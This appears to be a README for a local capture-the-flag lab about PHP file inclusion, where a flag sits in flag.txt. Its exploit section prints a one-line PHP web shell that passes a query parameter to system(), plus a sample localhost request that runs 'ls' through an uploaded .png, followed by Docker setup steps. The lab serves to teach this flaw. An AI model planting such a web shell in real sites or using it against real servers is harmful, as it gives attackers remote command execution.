# php webshell by include
### 1) summary
flag is in the flag.txt

### 2) vulnerabilities
When the php file is passed to inlucde function, it is executed.

### 3) exploit
When the following code is executed by the include function, 
```php
<?php
    echo system($_GET["cmd"]);
?>
```
you can execute a Linux command by passing cmd as a query parameter
```
http://localhost:8000/uploads/21.png?cmd=ls
```

### 4) How to run
Execute the following command in the location where the docker-compose.yml file is located
- docker
```
docker-compose up --build
```

- development mode
```
php -c ./php.ini -S localhost:8000
```